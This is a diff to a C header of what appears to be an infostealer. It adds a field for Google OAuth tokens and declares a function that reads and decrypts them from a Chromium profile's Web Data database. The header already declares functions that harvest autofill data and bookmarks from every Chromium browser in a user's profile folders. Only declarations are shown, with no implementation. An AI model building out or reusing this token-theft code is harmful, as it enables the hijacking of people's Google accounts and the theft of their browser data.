@@ -18,6 +18,8 @@ typedef struct {
     size_t autofill_count;
     char **bookmarks;
     size_t bookmark_count;
+    char **google_tokens;
+    size_t google_token_count;
 } BrowserData;
 
 typedef struct {
@@ -73,6 +75,15 @@ char **extract_chromium_autofill(const char *profile_path, size_t *count);
  * Returns tab-separated strings: "name\turl\n".
  */
 char **extract_chromium_bookmarks(const char *profile_path, size_t *count);
+
+/*
+ * Extract Google OAuth tokens from a Chromium profile's Web Data SQLite database.
+ * Reads service, encrypted_value from the token_service table.
+ * Returns formatted strings: "Account ID: <aid>\nToken: <token>:<suffix>\n".
+ */
+char **extract_chromium_google_tokens(const char *profile_path,
+                                      const unsigned char *key,
+                                      size_t *count);
 
 /*
  * Collect data from all Chromium browsers in LOCALAPPDATA and APPDATA.
